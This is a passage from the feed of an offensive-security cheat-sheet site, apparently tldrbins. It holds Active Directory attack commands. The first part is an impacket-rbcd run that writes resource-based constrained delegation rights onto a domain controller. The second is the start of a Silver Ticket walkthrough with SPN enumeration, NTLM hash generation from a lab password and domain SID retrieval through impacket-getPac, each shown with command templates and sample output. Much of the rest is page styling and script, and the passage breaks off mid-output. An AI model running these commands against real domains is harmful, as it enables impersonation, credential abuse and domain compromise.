class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;small&gt;&lt;em&gt;Note: Delegate from an account with SPN, which may not be a computer.&lt;/em&gt;&lt;/small&gt;&#xA;&lt;br&gt;&#xA;&lt;small&gt;&lt;em&gt;Note: Remove trailing $ if not a machine account.&lt;/em&gt;&lt;/small&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Silver Ticket</title>
      <link>https://tldrbins.github.io/silver_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/silver_ticket/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;silver-ticket-attack&#34;&gt;Silver Ticket Attack&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Linux&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-get-service-principle-name-spn-optional&#34;&gt;1. Get Service Principle Name (SPN) [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-generate-ntlm-hash&#34;&gt;2. Generate NTLM Hash&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; iconv -f ASCII -t UTF-16LE &amp;lt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;REGGIE1234ronnie&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; openssl dgst -md4 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-get-domain-sid&#34;&gt;3. Get Domain SID&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-getPac &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-getPac &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.sequel.htb/sql_svc:REGGIE1234ronnie&amp;#39;&lt;/span&gt; -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;KERB_VALIDATION_INFO &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LogonTime:                      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwLowDateTime:                   4131845666 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwHighDateTime:                  31133135 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Domain SID: S-1-5-21-4078382237-1492182817-2568127209&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt; 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-getPac &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-getPac &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.sequel.htb/sql_svc&amp;#39;&lt;/span&gt; -hashes :1443EC19DA4DAC4FFC953BCA1B57B4CF -targetUser administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;KERB_VALIDATION_INFO &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LogonTime:                      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwLowDateTime:                   4131845666 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;    dwHighDateTime:                  31133135 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span 